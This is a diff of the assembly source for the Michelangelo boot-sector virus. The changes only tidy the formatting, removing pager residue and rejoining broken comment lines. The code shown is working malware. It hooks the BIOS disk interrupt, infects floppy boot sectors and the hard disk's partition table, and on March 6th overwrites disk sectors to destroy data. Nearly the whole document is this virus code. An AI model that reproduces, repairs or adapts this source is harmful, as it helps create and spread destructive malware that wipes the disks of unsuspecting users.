@@ -21,7 +21,7 @@
 
 michelangelo    segment byte public
                 assume  cs:michelangelo, ds:michelangelo
---More--(8%)                org     0
+                org     0
 
                 jmp     entervirus
 highmemjmp      db      0F5h, 00h, 80h, 9Fh
@@ -43,7 +43,7 @@ int13h:
                 pushf
                 call    dword ptr cs:[oldint13h]; first call old int 13h
                 pushf
---More--(16%)                call    infectdisk              ; then infect
+                call    infectdisk              ; then infect
                 popf
                 retf    2
 exitint13h:     pop     ax
@@ -65,8 +65,7 @@ infectdisk:
                 pop     es
                 mov     si, 4
 readbootblock:
---More--(22%)                mov     ax,201h                 ; Read boot 
-block to
+                mov     ax,201h                 ; Read boot block to
                 mov     bx,200h                 ; after virus
                 mov     cx,1
                 xor     dx,dx
@@ -78,17 +77,15 @@ block to
                 call    oldint13h               ; Reset disk
                 dec     si                      ; loop back
                 jnz     readbootblock
-                jmp     short quitinfect        ; exit if too many 
-failures
+                jmp     short quitinfect        ; exit if too many failures
 checkinfect:
                 xor     si,si
                 cld
                 lodsw
-                cmp     ax,[bx]                 ; check if already 
-infected
+                cmp     ax,[bx]                 ; check if already infected
                 jne     infectitnow
                 lodsw
---More--(30%)                cmp     ax,[bx+2]               ; check again
+                cmp     ax,[bx+2]               ; check again
                 je      quitinfect
 infectitnow:
                 mov     ax,301h                 ; Write old boot block
@@ -107,10 +104,9 @@ is360Kdisk:
                 mov     cx,21h                  ; Copy partition table
                 cld
                 rep     movsw
-                mov     ax,301h                 ; Write virus to sector 
-1
+                mov     ax,301h                 ; Write virus to sector 1
                 xor     bx,bx
---More--(40%)                mov     cx,1
+                mov     cx,1
                 xor     dx,dx
                 pushf
                 call    oldint13h
@@ -129,12 +125,10 @@ entervirus:
                 mov     ds,ax
                 cli
                 mov     ss,ax
-                mov     ax,7C00h                ; Set stack to just 
-below
+                mov     ax,7C00h                ; Set stack to just below
                 mov     sp,ax                   ; virus load point
---More--(46%)                sti
-                push    ds                      ; save 0:7C00h on stack 
-for
+                sti
+                push    ds                      ; save 0:7C00h on stack for
                 push    ax                      ; later retf
                 mov     ax,ds:[13h*4]
                 mov     word ptr ds:[7C00h+offset oldint13h],ax
@@ -145,21 +139,18 @@ for
                 dec     ax
                 mov     ds:[413h],ax            ; move new value in
                 mov     cl,6
-                shl     ax,cl                   ; ax = paragraphs of 
-memory
-                mov     es,ax                   ; next line sets seg of 
-jmp
+                shl     ax,cl                   ; ax = paragraphs of memory
+                mov     es,ax                   ; next line sets seg of jmp
                 mov     word ptr ds:[7C00h+2+offset highmemjmp],ax
                 mov     ax,offset int13h
                 mov     ds:[13h*4],ax
                 mov     ds:[13h*4+2],es
                 mov     cx,offset partitioninfo
---More--(56%)                mov     si,7C00h
+                mov     si,7C00h
                 xor     di,di
                 cld
                 rep     movsb                   ; copy to high memory
-                                                ; and transfer control 
-there
+                                                ; and transfer control there
                 jmp     dword ptr cs:[7C00h+offset highmemjmp]
 ; destination of highmem jmp
                 xor     ax,ax
@@ -172,11 +163,9 @@ there
                 mov     cx,firstsector
                 cmp     cx,7                    ; hard disk infection?
                 jne     floppyboot              ; if not, do floppies
-                mov     dx,80h                  ; Read old partition 
-table of
-                int     13h                     ; first hard disk to 
-0:7C00h
---More--(65%)                jmp     short exitvirus
+                mov     dx,80h                  ; Read old partition table of
+                int     13h                     ; first hard disk to 0:7C00h
+                jmp     short exitvirus
 floppyboot:
                 mov     cx,firstsector          ; read old boot block
                 mov     dx,100h                 ; to 0:7C00h
@@ -198,15 +187,13 @@ floppyboot:
                 lodsw                           ; check infection
                 cmp     ax,[bx+2]
                 jne     infectharddisk
---More--(74%)exitvirus:exitvirus:
-                xor     cx,cx                   ; Real time clock get 
-date
+exitvirus:
+                xor     cx,cx                   ; Real time clock get date
                 mov     ah,4                    ; dx = mon/day
                 int     1Ah
                 cmp     dx,306h                 ; March 6th
                 je      damagestuff
-                retf                            ; return control to 
-original
+                retf                            ; return control to original
                                                 ; boot block @ 0:7C00h
 damagestuff:
                 xor     dx,dx
@@ -220,13 +207,12 @@ smashanothersector:
                 cmp     si,0Eh
                 je      smashit
                 mov     dl,80h                  ; first hard disk
---More--(82%)                mov     maxhead,4
+                mov     maxhead,4
                 mov     al,11h
 smashit:
                 mov     bx,5000h                ; random memory area
                 mov     es,bx                   ; at 5000h:5000h
-                int     13h                     ; Write al sectors to 
-drive dl
+                int     13h                     ; Write al sectors to drive dl
                 jnc     skiponerror             ; skip on error
                 xor     ah,ah                   ; Reset disk drive dl
                 int     13h
@@ -234,15 +220,13 @@ skiponerror:
                 inc     dh                      ; next head
                 cmp     dh,maxhead              ; 2 if floppy, 4 if HD
                 jb      smashanothersector
-                xor     dh,dh                   ; go to next 
-head/cylinder
+                xor     dh,dh                   ; go to next head/cylinder
                 inc     ch
                 jmp     short smashanothersector
 infectharddisk:
-                mov     cx,7                    ; Write partition table 
-to
+                mov     cx,7                    ; Write partition table to
                 mov     firstsector,cx          ; sector 7
---More--(91%)                mov     ax,301h
+                mov     ax,301h
                 mov     dx,80h
                 int     13h
                 jc      exitvirus
